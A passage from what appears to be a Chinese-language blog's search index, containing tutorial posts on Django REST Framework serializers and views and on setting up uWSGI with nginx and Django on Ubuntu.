**kwargs): return self.destroy(request, *args, **kwargs) 可看出，这三个 Mixin 分别对应 GET/PUT/DELETE 动作。 ","date":"2016-04-03","objectID":"/zh-cn/drf-tutorial-3/:1:2","tags":["Python","Django","RESTful"],"title":"Django REST Framework 3-基于类的视图","uri":"/zh-cn/drf-tutorial-3/"},{"categories":["Code","Python"],"content":"使用通用类视图 使用 Mixin 来重写 views 减少了代码量，但是还可以更少！ 那就是使用「通用类视图」—「generic class based views」 同 Django 一样，DRF为我们提供了现成的通用类视图，接下来我们使用这些通用类视图再一次修改原有的 views.py : from douban.models import Movies from douban.serializer import MoviesSerializer from rest_framework import generics class MoviesList(generics.ListCreateAPIView): queryset = Movies.objects.all() serializer_class = MoviesSerializer class MoviesDetail(generics.RetrieveUpdateDestroyAPIView): queryset = Movies.objects.all() serializer_class = MoviesSerializer 这样，代码已经非常的精简了，不过坏处在于，你不知道他具体执行了什么。 ","date":"2016-04-03","objectID":"/zh-cn/drf-tutorial-3/:1:3","tags":["Python","Django","RESTful"],"title":"Django REST Framework 3-基于类的视图","uri":"/zh-cn/drf-tutorial-3/"},{"categories":["Code","Python"],"content":"请求与响应 ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:0","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"请求对象 DRF 提供了一个 request 对象，它继承自 HttpRequest 并且提供了更丰富的对 request 的解析处理的方法。其中最核心的是 request 对象的 request.data 属性，它看起来和 Django 的request.POST 相似，但是在处理 Web API 上更强大些。 request.POST # Only handles form data. Only works for 'POST' method. request.data # Handles arbitrary data. Works for 'POST', 'PUT' and 'PATCH' methods. request.data 相比于 request.POST 能够处理 api 中的 「POST」、「PUT」、「PATCH」等请求。 ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:1","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"返回对象 DRF 也提供了一个 response 对象，它能把未 render 的对象(数据)通过一定方式转化为正确的数据格式返回给客户端。 return Response(data) # Renders to content type as requested by the client. ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:2","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"状态码 如果单独使用 Http 状态码的话代码会很难度，比如像我这种万年记不住几个很奇怪的状态码的人，在看到它们的时候还要 google 这就很伤！所以 DRF 提供了一个可读性更好的状态码标识，比如 HTTP_400_BAD_REQUEST ，是不是一下就看出来这是 bad request 了。这些状态码都封装在了 status 模块里，使用它们比使用纯数字的 Http 状态码更安逸。 ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:3","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"封装的 API views DRF 提供了两个封装好的 API views @api_view 这个装饰器用于基于函数的视图 APIView 这个类用于基于类的视图 这两个 views 提供了一些函数如确保在视图中接收到 request 实例和自动在 response 对象中添加 context 使其能够被 render 。 ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:4","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"开始撸代码吧 紧接着上节的教程我们要在 views 中添加一些新功能 先把 JSONResponse 扔掉，这东西太难用了，我们不再需要它。 接着在 douban/views.py 中加入以下代码: #!/usr/bin/python # -*- coding: utf-8 -*- from rest_framework import status from rest_framework.decorators import api_view from rest_framework.response import Response from douban.models import Movies from douban.serializer import MoviesSerializer @api_view(['GET', 'POST']) def movies_list(request): \"\"\" 罗列出所有的 Movies 或者 能新建一个 Movies \"\"\" if request.method == 'GET': movies = Movies.objects.all() serializer = MoviesSerializer(movies, many=True) return Response(serializer.data) elif request.method == 'POST': serializer = MoviesSerializer(data=request.data) if serializer.is_valid(): serializer.save() return Response(serializer.data, status=status.HTTP_201_CREATED) return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST) @api_view(['GET', 'PUT', 'DELETE']) def movies_detail(request, pk): \"\"\" 展示\\更新或删除一个 Movies \"\"\" try: movies = Movies.objects.get(pk=pk) except Movies.DoesNotExist: return Response(status=status.HTTP_404_NOT_FOUND) if request.method == 'GET': serializer = MoviesSerializer(movies) return Response(serializer.data) elif request.method == 'PUT': serializer = MoviesSerializer(movies, data=request.data) if serializer.is_valid(): serializer.save() return Response(serializer.data) return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST) elif request.method == 'DELETE': movies.delete() return Response(status=status.HTTP_204_NO_CONTENT) 用上了 @api_view 后代码比之前更简洁了。 需要注意的是: 我们不再指明 request 和 response 中的内容类型。 request.DATA 即可用来处理 json 数据类型类型, 也可以处理 yaml 或其他数据类型。我们只需要在 response 中指定要返回的数据， DRF 能根据不同情况，自动在 response 中呈现正确的数据类型。 ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:5","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"在 URLs 中添加可选后缀 现在我们的 response 对象不是像教程1中的对数据类型进行强制要求了。 并且对 url 也不是硬连接的。 那么就可以定制可选的 url 后缀，如: 通过 http://example.com/api/items/4/.json 来访问 Web API。 我们所需做的就是在 views 中添加 format 关键字: def movies_list(request, format=None): 还有 def movies_detail(request, pk, format=None): 然后在 douban/urls.py 中加入 format_suffix_patterns : #!/usr/bin/python # -*- coding: utf-8 -*- from django.conf.urls import url from rest_framework.urlpatterns import format_suffix_patterns from douban import views urlpatterns = [ url(r'^dbmovies/$', views.movies_list), url(r'^dbmovies/(?P\u003cpk\u003e[0-9]+)/$', views.movies_detail), ] urlpatterns = format_suffix_patterns(urlpatterns) 不过，一般情况下，我们耶不会用到那么奇葩的 url 访问方式，以上的例子只是说明了用奇葩的 url 方式也是可以访问的 ：D ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:6","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"再测试下我们的 API 在终端中输入 $ python manage.py runserver 接着来浏览器中访问 http://127.0.0.1/dbmovies/ 如果出现如图所示的 api 则说明 Web api 返回成功。 然后我们可以在这个页面中 POST 一个新的 Movies : 在表单中选择 Media type 为 json 格式并输入 { \"id\": 3, \"title\": \"Carol\", \"year\": \"2015\", \"country\": \"US\", \"type\": \"Romance\", \"rating\": \"8.3\" } 如果返回如下图所示，则说明 POST 成功！ 你或许会注意到，每个访问这个页面的人都能 POST 一个新的 Movies ，这是不合理的，所以需要赋予权限，这个我们日后再说。 ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:7","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"可浏览性 Because the API chooses the content type of the response based on the client request, it will, by default, return an HTML-formatted representation of the resource when that resource is requested by a web browser. This allows for the API to return a fully web-browsable HTML representation. Having a web-browsable API is a huge usability win, and makes developing and using your API much easier. It also dramatically lowers the barrier-to-entry for other developers wanting to inspect and work with your API. See the browsable api topic for more information about the browsable API feature and how to customize it. ","date":"2016-04-02","objectID":"/zh-cn/drf-tutorial-2/:1:8","tags":["Python","Django","RESTful"],"title":"Django REST Framework 2-请求和响应","uri":"/zh-cn/drf-tutorial-2/"},{"categories":["Code","Python"],"content":"序列化 ","date":"2016-04-01","objectID":"/zh-cn/drf-tutorial-1/:1:0","tags":["Python","Django","RESTful"],"title":"Django REST Framework 1-序列化","uri":"/zh-cn/drf-tutorial-1/"},{"categories":["Code","Python"],"content":"环境搭建 首先我们先新建一个 restapi 项目并安装上 django-rest-framework (DRF) 环境 $ pip install djangorestframework $ python manage.py startnewproject restapi $ cd restapi $ python manage.py startnewapp douban 接着，我们需要在 setting.py 里的加入如下代码: INSTALLED_APPS = ( ... 'rest_framework', 'douban', ) ","date":"2016-04-01","objectID":"/zh-cn/drf-tutorial-1/:1:1","tags":["Python","Django","RESTful"],"title":"Django REST Framework 1-序列化","uri":"/zh-cn/drf-tutorial-1/"},{"categories":["Code","Python"],"content":"建立模型 由于我炒鸡喜欢看电影，所以仿着 douban-API 来做个简易的豆瓣电影的 rest-api 。 所以我们就用这个「仿豆瓣电影 api 」来作为栗子开始教程吧！ 编辑 douban/models.py 文件并加入以下代码: #!/usr/bin/python # -*- coding: utf-8 -*- from django.db import models # 举个栗子 COUNTRY_CHOICES = ( ('US', 'US'), ('Asia', 'Asia'), ('CN', 'CN'), ('TW', 'TW'), ) TYPE_CHOICES = ( ('Drama', 'Drama'), ('Thriller', 'Thriller'), ('Sci-Fi', 'Sci-Fi'), ('Romance', 'Romance' ), ('Comedy', 'Comedy') ) GENDER_CHOICES = ( ('male', 'male'), ('female', 'female') ) class movies(models.Model): title = models.CharField(max_length=100, blank=True, default='') year = models.CharField(max_length=20) # 在 director 关联了 movies 类 和 celecrity 类, 在第4章会用到 celebrity 类 # director = models.ForeignKey('celebrity', related_name='movies') country = models.CharField(choices=COUNTRY_CHOICES, default='US', max_length=20) type = models.CharField(choices=TYPE_CHOICES, default='Romance', max_length=20) rating = models.DecimalField(max_digits=3, decimal_places=1) created = models.DateTimeField(auto_now_add=True) class Meta: ordering = ('created',) # class celebrity(models.Model): # name = models.CharField(max_length=100, blank=True, default='') # age = models.IntegerField() # gender = models.CharField(choices=GENDER_CHOICES, default='男', max_length=20) 接着在终端中运行: $ python manage.py makemigrations douban $ python manage.py migrate $ python manage.py syncdb 来创建一个新的 migrations 并在数据库中生成表。 ","date":"2016-04-01","objectID":"/zh-cn/drf-tutorial-1/:1:2","tags":["Python","Django","RESTful"],"title":"Django REST Framework 1-序列化","uri":"/zh-cn/drf-tutorial-1/"},{"categories":["Code","Python"],"content":"创建序列化类 在开始构建 Web API 时，我们首先要做的就是提供对 movies 实例的序列化和反序列化(即对序列化后的实例进行「解码」)，这样才能生成可供浏览的 json 格式的 api 。我们可以通过声明「序列器」(一个和 Django 表单十分类似的玩意儿)来做到这一点。 在 restapi 目录中创建一个 serializer.py 文件，加入以下代码: #!/usr/bin/python # -*- coding: utf-8 -*- from rest_framework import serializers from douban.models import movies, COUNTRY_CHOICES, TYPE_CHOICES class MoviesSerializer(serializers.Serializer): pk = serializers.IntegerField(read_only=True) title = serializers.CharField(required=False, allow_blank=True, max_length=100) year = serializers.CharField(max_length=20) country = serializers.ChoiceField(choices=COUNTRY_CHOICES, default='US') type = serializers.ChoiceField(choices=TYPE_CHOICES, default='Romance') rating = serializers.DecimalField(max_digits=3, decimal_places=1) def create(self, validated_data): \"\"\" 根据接收到的 validated_data 创建一个 movies 实例 \"\"\" return movies.objects.create(**validated_data) def update(self, instance, validated_data): \"\"\" 根据接收到的 validated_data 更新并返回一个 movies 实例 \"\"\" instance.title = validated_data.get('title', instance.title) instance.year = validated_data.get('year', instance.year) instance.country = validated_data.get('country', instance.country) instance.type = validated_data.get('type', instance.type) instance.rating = validated_data.get('rating', instance.rating) instance.save() return instance 序列器的第一个部分定义了要进行序列化/反序列化的字段。 create() 和 update() 方法定义了符合规范的 movies 实例的创建和更新的方法。 序列器非常类似于 Django Form 表单，它包含了几种对字段常见的验证标识符，如 required 、 max_length 、 default 等。这些标识符实现的功能类似于 Django 表单，就不详细解释了。 所以序列器实现了以下两个功能: 选择相应的模型 选择要展现的字段(验证后的) 我们也可以通过使用 ModelSerializer 多快好省地的构建序列器，这个我们日后再说。 ","date":"2016-04-01","objectID":"/zh-cn/drf-tutorial-1/:1:3","tags":["Python","Django","RESTful"],"title":"Django REST Framework 1-序列化","uri":"/zh-cn/drf-tutorial-1/"},{"categories":["Code","Python"],"content":"开始使用序列器 在开始项目之前，我们先熟悉下序列器，在终端中启动 Django shell : $ python manage.py shell 输入以下代码来创建2个 Movies 实例 「荒野猎人」和「蝙蝠侠爱上超人」 from douban.models import Movies from douban.serializer import MoviesSerializer from rest_framework.renderers import JSONRenderer from rest_framework.parsers import JSONParser movies = Movies(title='The Revenant', year='2015', country='US', type='Drama', rating=7.9) movies.save() movies = Movies(title='Batman v Superman: Dawn of Justice', year='2016', country='US', type='Romance', rating=6.7) movies.save() 然后将其中一个实例序列化 serializer = MoviesSerializer(movies) serializer.data #{'rating': u'7.9', 'title': u'The Revenant', 'country': 'US', 'year': u'2015', 'pk': None, 'type': 'Drama'} 接着我们将以上数据转换为 JSON 格式，实现序列化 content = JSONRenderer().render(serializer.data) content #{\"pk\":null,\"title\":\"The Revenant\",\"year\":\"2015\",\"country\":\"US\",\"type\":\"Drama\",\"rating\":\"7.9\"}' 反序列化也类似，通过解析 Python 数据流并将数据流\"引入\"实例中即可 from django.utils.six import BytesIO stream = BytesIO(content) data = JSONParser().parse(stream) serializer = MoviesSerializer(data=data) serializer.is_valid() # True serializer.validated_data #OrderedDict([(u'title', u'The Revenant'), (u'year', u'2015'), (u'country', 'US'), (u'type', 'Drama'), (u'rating', Decimal('7.9'))]) 可见, serializer和django form 有多么相似, 当我们写view时, 这一相似性会更加明显. 当我们输入参数many=True时, serializer还能序列化queryset: serializer = MoviesSerializer(Movies.objects.all(), many=True) serializer.data [OrderedDict([('pk', 1), ('title', u'Batman v Superman: Dawn of Justice'), ('year', u'2016'), ('country', 'US'), ('type', 'Romance'), ('rating', u'6.7')]), OrderedDict([('pk', 2), ('title', u'The Revenant'), ('year', u'2015'), ('country', 'US'), ('type', 'Drama'), ('rating', u'7.9')])] ","date":"2016-04-01","objectID":"/zh-cn/drf-tutorial-1/:1:4","tags":["Python","Django","RESTful"],"title":"Django REST Framework 1-序列化","uri":"/zh-cn/drf-tutorial-1/"},{"categories":["Code","Python"],"content":"使用更高级的 ModelSerializers 接着如果你按照官网的教程走下去，你会发现上面的 serializer.py 是个代码冗杂的序列器，这不符合 Python 的风格。 所以我们要做的就是简化代码。 DRF 提供了更为简便的 ModelSerializer 类可以解决这个问题。 所以我们修改之前的 serializer.py : class MoviesSerializer(serializers.ModelSerializer): class Meta: model = Movies fields = ('id', 'title', 'year', 'country', 'type', 'rating') 这种模式的序列器可以很方便地检查 fields 中的每个字段 然后在终端中打开 Django shell $ python manage.py shell 输入以下代码 from douban.serializer import MoviesSerializer serializer = MoviesSerializer() print(repr(serializer)) #MoviesSerializer(): id = IntegerField(label='ID', read_only=True) title = CharField(allow_blank=True, max_length=100, required=False) year = CharField(max_length=20) country = ChoiceField(choices=(('US', 'US'), ('Asia', 'Asia'), ('CN', 'CN'), ('TW', 'TW')), required=False) type = ChoiceField(choices=(('Drama', 'Drama'), ('Thriller', 'Thriller'), ('Sci-Fi', 'Sci-Fi'), ('Romance', 'Romance'), ('Comedy', 'Comedy')), required=False) rating = DecimalField(decimal_places=1, max_digits=3) 注: ModelSerializer 类仅仅是创建 serializer 类的一个快捷方法，它除了实现以下两种方法外并没有其余的功能: 声明需要展现的字段 定义 create() 和 update() 方法 ","date":"2016-04-01","objectID":"/zh-cn/drf-tutorial-1/:1:5","tags":["Python","Django","RESTful"],"title":"Django REST Framework 1-序列化","uri":"/zh-cn/drf-tutorial-1/"},{"categories":["Code","Python"],"content":"使用 Django views 编写序列器视图 为了更好理解序列器，我们不使用 DRF 的其他特性，仅仅用 Django views 模式来编写序列器的视图。 我们会创建一个 HttpResponse 的子类，这样就能将数据以 json 格式返回。 编辑 douban/views.py 加入以下代码: from django.http import HttpResponse from django.views.decorators.csrf import csrf_exempt from rest_framework.renderers import JSONRenderer from rest_framework.parsers import JSONParser from douban.models import Movies from douban.serializer import MoviesSerializer class JSONResponse(HttpResponse): \"\"\" 将数据转为 JSON 格式的 HttpResponse 子类 \"\"\" def __init__(self, data, **kwargs): content = JSONRenderer().render(data) kwargs['content_type'] = 'application/json' super(JSONResponse, self).__init__(content, **kwargs) 讲道理的话，我们 api 的根目录应该能罗列出所有的 Movies 或者 能新建一个 Movies 并且还需要一个用于展示、更新和删除 Movies 的 views 编辑 douban/views.py 加入以下代码: #!/usr/bin/python # -*- coding: utf-8 -*- from django.http import HttpResponse from django.views.decorators.csrf import csrf_exempt from rest_framework.renderers import JSONRenderer from rest_framework.parsers import JSONParser from douban.models import Movies from douban.serializer import MoviesSerializer class JSONResponse(HttpResponse): \"\"\" 将数据转为 JSON 格式的 HttpResponse 子类 \"\"\" def __init__(self, data, **kwargs): content = JSONRenderer().render(data) kwargs['content_type'] = 'application/json' super(JSONResponse, self).__init__(content, **kwargs) @csrf_exempt def movies_list(request): \"\"\" 罗列出所有的 Movies 或者 能新建一个 Movies \"\"\" if request.method == 'GET': movies = Movies.objects.all() serializer = MoviesSerializer(movies, many=True) return JSONResponse(serializer.data) elif request.method == 'POST': data = JSONParser().parse(request) serializer = MoviesSerializer(data=data) if serializer.is_valid(): serializer.save() return JSONResponse(serializer.data, status=201) return JSONResponse(serializer.errors, status=400) @csrf_exempt def movies_detail(request, pk): \"\"\" 展示\\更新或删除一个 Movies \"\"\" try: movies = Movies.objects.get(pk=pk) except Movies.DoesNotExist: return HttpResponse(status=404) if request.method == 'GET': serializer = MoviesSerializer(movies) return JSONResponse(serializer.data) elif request.method == 'PUT': data = JSONParser().parse(request) serializer = MoviesSerializer(snippet, data=data) if serializer.is_valid(): serializer.save() return JSONResponse(serializer.data) return JSONResponse(serializer.errors, status=400) elif request.method == 'DELETE': movies.delete() return HttpResponse(status=204) 我不是很弄明白这里关掉 csrf 的意义，那不如直接就不用 csrf 不就好了？ 不管了，先放着，以后回来看 ( 吐舌头 最后修改 douban/url.py 导入相应的视图 from django.conf.urls import url from douban import views urlpatterns = [ url(r'^dbmovies/$', views.movies_list), url(r'^dbmovies/(?P\u003cpk\u003e[0-9]+)/$', views.movies_detail), ] 并在 restapi/url.py 中 include 一下 from django.conf.urls import url, include urlpatterns = [ url(r'^', include('douban.urls')), ] 这样 url 和 views 就绑定好了。 ","date":"2016-04-01","objectID":"/zh-cn/drf-tutorial-1/:1:6","tags":["Python","Django","RESTful"],"title":"Django REST Framework 1-序列化","uri":"/zh-cn/drf-tutorial-1/"},{"categories":["Code","Python"],"content":"测试 Web API 在终端中输入 $ python manage.py runserver 接着来浏览器中访问 http://127.0.0.1/dbmovies/ 如果出现如图所示的 api 则说明 Web api 返回成功。 (顺便安利一个 chrome 插件 — FeHelper 可以自动格式化 JSON 代码) ","date":"2016-04-01","objectID":"/zh-cn/drf-tutorial-1/:1:7","tags":["Python","Django","RESTful"],"title":"Django REST Framework 1-序列化","uri":"/zh-cn/drf-tutorial-1/"},{"categories":["Code","Python"],"content":"Django REST Framework 快速上手 ","date":"2016-03-29","objectID":"/zh-cn/django-rest-framework/:1:0","tags":["Python","Django"],"title":"Django REST Framework 快速上手","uri":"/zh-cn/django-rest-framework/"},{"categories":["Code","Python"],"content":"背景 这几天正好在研究 RESTful 的方式来写 API，然后上手 Django REST 框架。 Django REST Framework (以下简称 DRF )是一个轻量级的库，熟悉 Django 的话可以很容易的用它来构建 Web API。 ","date":"2016-03-29","objectID":"/zh-cn/django-rest-framework/:1:1","tags":["Python","Django"],"title":"Django REST Framework 快速上手","uri":"/zh-cn/django-rest-framework/"},{"categories":["Code","Python"],"content":"安装前提 Django REST Framework 安装需要以下前提: Python (2.7, 3.2, 3.3, 3.4, 3.5) Django (1.7+, 1.8, 1.9) 我自己的环境是: Python 2.7.10 Django 1.8.2 ","date":"2016-03-29","objectID":"/zh-cn/django-rest-framework/:1:2","tags":["Python","Django"],"title":"Django REST Framework 快速上手","uri":"/zh-cn/django-rest-framework/"},{"categories":["Code","Python"],"content":"安装配置 安装 DRF 需要用到 pip 命令 pip install djangorestframework pip install markdown # Markdown support for the browsable API. pip install django-filter # Filtering support 或者在 GitHub 上 clone 它 git clone git@github.com:tomchristie/django-rest-framework.git 接着在 Django Project 根目录的 setting.py 文件中的 INSTALLED_APPS 加入 'rest_framework' INSTALLED_APPS = ( ... 'rest_framework', ) 如果你要使用 DRF 的 browsable API 的话，你可能还需要添加 REST 框架的登录登出视图 ( views )，辣么需要在 url.py 文件中加入以下代码: urlpatterns = [ ... url(r'^api-auth/', include('rest_framework.urls', namespace='rest_framework')) ] 注: 这个 URL 地址可以是任意的，但是必须 include 'rest_framework.urls' 和 namespace='rest_framework' 。 ","date":"2016-03-29","objectID":"/zh-cn/django-rest-framework/:1:3","tags":["Python","Django"],"title":"Django REST Framework 快速上手","uri":"/zh-cn/django-rest-framework/"},{"categories":["Code","Python"],"content":"举个栗子 现在我们来看一下一个简单的用 DRF 来构建一个模型支持较好的 API 的栗子。 任何一个对 REST 框架的全局设置都被放在 REST_FRAMEWORK 的模块内，所以你需要在 settings.py 文件中添加以下代码来通过 REST_FRAMEWORK 入口进行全局设置: REST_FRAMEWORK = { # Use Django's standard `django.contrib.auth` permissions, # or allow read-only access for unauthenticated users. 'DEFAULT_PERMISSION_CLASSES': [ 'rest_framework.permissions.DjangoModelPermissionsOrAnonReadOnly' ] } 现在我们可以构建 API 了，编辑 Django 项目根目录的 url.py 文件: from django.conf.urls import url, include from django.contrib.auth.models import User from rest_framework import routers, serializers, viewsets # Serializers define the API representation. class UserSerializer(serializers.HyperlinkedModelSerializer): class Meta: model = User fields = ('url', 'username', 'email', 'is_staff') # ViewSets define the view behavior. class UserViewSet(viewsets.ModelViewSet): queryset = User.objects.all() serializer_class = UserSerializer # Routers provide an easy way of automatically determining the URL conf. router = routers.DefaultRouter() router.register(r'users', UserViewSet) # Wire up our API using automatic URL routing. # Additionally, we include login URLs for the browsable API. urlpatterns = [ url(r'^', include(router.urls)), url(r'^api-auth/', include('rest_framework.urls', namespace='rest_framework')) ] 解释一下， 每个 xxxSerializer 都要继承 ModelSerializer 来选择模型和模型字段。 UserSerializer 类继承了更符合 RESTful 设计的 HyperlinkedModelSerializer 超链接模型 Serializer 类，它和普通的 ModelSerializer 类有以下区别: 缺省状态下不包含 pk 字段 具有一个 url 字段，即HyperlinkedIdentityField类型 用HyperlinkedRelatedField表示关系，而非PrimaryKeyRelatedField 然后在 class Meta 中选择模型和要展现的模型元素 ViewSet 用来定义 View 的行为，和 Django 的 views 类似，用来处理 API 的 read 、write、 update 等方法(而 Django views 则处理 http 的 GET 和 POST ) 在 ViewSet 实例化之后，通过 Router 类，最终将 URL 和 ViewSet 方法绑定起来。 ok，现在你可以通过在浏览器中访问 http://127.0.0.1:8000/ 来查看你的 ‘users’ API 了。 ","date":"2016-03-29","objectID":"/zh-cn/django-rest-framework/:1:4","tags":["Python","Django"],"title":"Django REST Framework 快速上手","uri":"/zh-cn/django-rest-framework/"},{"categories":["Code","Python"],"content":"背景 : 公司要求用 Django 做些项目，之前按网上教程搭环境的时候就遇到很多问题，感觉有些教程都是有误的，今天用 uWSGI 开多线程的时候服务器报了 HTTP 500 的错( Internal Server Error )，然后就一直连不上去了。所以按官网的教程重新配置一遍，把出现的问题记录下来。 ","date":"2016-02-27","objectID":"/zh-cn/nginx-uwsgi-django/:0:1","tags":["Python","Django","Nginx"],"title":"在 Ubuntu 下搭建 uWSGI + nginx + Django","uri":"/zh-cn/nginx-uwsgi-django/"},{"categories":["Code","Python"],"content":"准备工作 概况 一个 Web 服务器能加载 ( Html , images , CSS 等静态文件)，但是它不能直接跑 Django 应用 (对于动态的请求无法处理) ，它需要某些工具来支持 Django 应用的运行，从而使 服务器能够接受客户端的请求，处理，并返回请求。s 这时，我们就需要一个服务器网关接口 – WSGI ! WSGI 是一种Web服务器网关接口。它是一个 Web 服务器（如 nginx）与应用服务器（如 uWSGI 服务器）通信的一种规范 而 uWSGI 是一个Web服务器，它实现了 WSGI 协议、 uwsgi 、 http 等协议。 nginx 中 HttpUwsgiModule 的作用是与 uWSGI 服务器进行数据交换。 所以这套配置的实现原理是将 nginx 作为服务器最前端，它将接收 Web 的所有请求，统一管理请求。nginx 把所有静态请求自己来处理（这是 Nginx 的强项）。然后，Nginx 将所有非静态请求通过 uwsgi 传递给 Django ，由 Django 来进行处理，从而完成一次 Web 请求。 配置 uWSGI + nginx + Django 即实现以下4个链接，在下文，我们会一步步进行链接。 the web client \u003c-\u003e the web server \u003c-\u003e the socket \u003c-\u003e uwsgi \u003c-\u003e Django Python Ubuntu 14.04 自带了 Python2.7.6 你也可以通过 sudo apt-get install python2.7 python2.7-dev 来安装最新版本的 Python2.7.11 Python-pip pip 是 Python 的包管理工具，建议 Python 的包都用 pip 进行管理。 通过以下命令安装 pip : sudo apt-get install python-pip Django 通过以下命令安装 Django 并创建一个新的项目，然后进入到项目根目录 : sudo pip install Django django-admin.py startproject mysite cd mysite 关于域名和端口 在这篇 blog 中，我们把调试域名定为 127.0.0.1，你可以用自己的域名或本机 ip 地址来替代它。 并且，我们用 8000 端口作为 web 调试地址端口，这个端口与大部分 web 服务器的端口不重叠，当然你也可以自行修改调试地址的端口。 ","date":"2016-02-27","objectID":"/zh-cn/nginx-uwsgi-django/:0:2","tags":["Python","Django","Nginx"],"title":"在 Ubuntu 下搭建 uWSGI + nginx + Django","uri":"/zh-cn/nginx-uwsgi-django/"},{"categories":["Code","Python"],"content":"安装配置 uWSGI 安装 sudo pip install uwsgi 用 pip 安装 uwsgi 最为方便，因为如果你用 apt-get install 来安装 uwsgi 的话，你需要在 Python 搜索路径中添加入 uwsgi 模块。 测试 uwsgi 在刚刚的 mysite 目录下新建一个 Python 文件 test.py : # test.py def application(env, start_response): start_response('200 OK', [('Content-Type','text/html')]) return [b\"Hello World\"] # python3 #return [\"Hello World\"] # python2 接着运行 uWSGI 命令: uwsgi --http :8000 --wsgi-file test.py 注意：在 http 与 :8000 之间有一个空格！ 参数含义： http :8000：使用 http 协议，8000端口 wsgi-file test.py : 加载指定文件 test.py 接着在浏览器中输入以下 url : http://127.0.0.1:8000 如果出现了 ‘Hello World!’ 那说明 uWSGI 安装成功，以下链接是成功的 : the web client \u003c-\u003e uWSGI \u003c-\u003e Django 测试 Django 项目 现在我们用 uWSGI 来跑 Django 网站试试。 首先进入 Django 项目根目录，即之前的 /mysite/ 运行 python manage.py runserver 127.0.0.1:8888 在浏览器中访问该 url ，如果出现如下界面则说明你的 mysite 项目是可运行的 : 接着运行 uWSGI : uwsgi --http :8000 --module mysite.wsgi module mysite.wsgi : 读取特定的 wsgi 模块 如果出现同样的界面，说明你的 uWSGI 已经可以搭载你的 Django 应用惹，所以以下的链接是成功的 : the web client \u003c-\u003e uWSGI \u003c-\u003e Django ","date":"2016-02-27","objectID":"/zh-cn/nginx-uwsgi-django/:0:3","tags":["Python","Django","Nginx"],"title":"在 Ubuntu 下搭建 uWSGI + nginx + Django","uri":"/zh-cn/nginx-uwsgi-django/"},{"categories":["Code","Python"],"content":"安装配置 nginx 安装 nginx sudo apt-get install nginx sudo /etc/init.d/nginx start # 开启 nginx 服务 现在到浏览器中输入 http://127.0.0.1 ，如果你看到以下信息 : “Welcome to nginx!”那么说明 nginx 服务器运行成功，以下链接成功 : the web client \u003c-\u003e the web server 配置 nginx 首先，你需要一个 uwsgi_params 文件。 将 uwsgi_params 文件拷贝到项目文件夹下(即 /mysite/ )。uwsgi_params文件在/etc/nginx/目录下，也可以从这个页面下载 在项目文件夹下创建文件 mysite_nginx.conf ,填入并修改下面内容： # mysite_nginx.conf # the upstream component nginx needs to connect to upstream django { # server unix:///path/to/your/mysite/mysite.sock; # for a file socket server 127.0.0.1:8001; # for a web port socket (we'll use this first) } # configuration of the server server { # the port your site will be served on listen 8000; # the domain name it will serve for server_name 127.0.0.1; # substitute your machine's IP address or FQDN charset utf-8; # max upload size client_max_body_size 75M; # adjust to taste # Django media location /media { alias /path/to/your/mysite/media; # your Django project's media files - amend as required } location /static { alias /path/to/your/mysite/static; # your Django project's static files - amend as required } # Finally, send all non-media requests to the Django server. location / { uwsgi_pass django; include /path/to/your/mysite/uwsgi_params; # the uwsgi_params file you installed } } 在终端中进入之前的 /mysite/ 项目文件夹，输入 ``pwd``` ，复制下该路径，将 mysite_nginx.conf 中的 /path/to/your/mysite 全部替换掉。 在/etc/nginx/sites-enabled目录下创建本文件的连接，使nginx能够使用它 : sudo ln -s ~/path/to/your/mysite/mysite_nginx.conf /etc/nginx/sites-enabled/ 注意：记得检查 /etc/nginx/sites-enabled/ 下的软链接是否成功，因为之前我就遇到了路径出错的问题。 部署静态文件 在运行 nginx 前，你还需要把 Django 的所有静态文件全部整理到之前的 static 文件夹里，在 /mysite/mysite/settings.py 中添加以下内容 : STATIC_ROOT = os.path.join(BASE_DIR, \"static/\") 接着运行 python manage.py collectstatic 现在你发现 Django 所有的静态文件都被整理到了 /mysite/static/ 文件夹里了。 测试 nginx 首先重启 ngxin 服务 : sudo /etc/init.d/nginx restart 在 /mysite/mysite/media/ 文件夹中添加一个 media.png 文件。 在浏览器中打开 :http://127.0.0.1:8000/media/media.png 如果显示出了图片，说明 nginx 服务已经正确运行惹。 注意在从浏览器中请求图片信息时，在 uwsgi 里是没有输出信息的，而请求一个其他的动态网页时，则会输出类似 [pid: 1952|app: 0|req: 3/3] 127.0.0.1 () {36 vars in 599 bytes} [Wed Mar 18 08:43:27 2015] GET /time/ =\u003e generated 63 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0) 这样的信息。 也就是缩，当你在浏览器中请求 media.png 时， nginx 会检查这个地址 /media/ ，接着它会在 mysite_nginx.conf 文件中看到这段代码: location /media { alias /home/thehackercat/Dev/mysite/mysite/media; # your Django project's media files - amend as required 它会直接从这个路径下去寻找图片，找到了就显示粗来，没找着就报 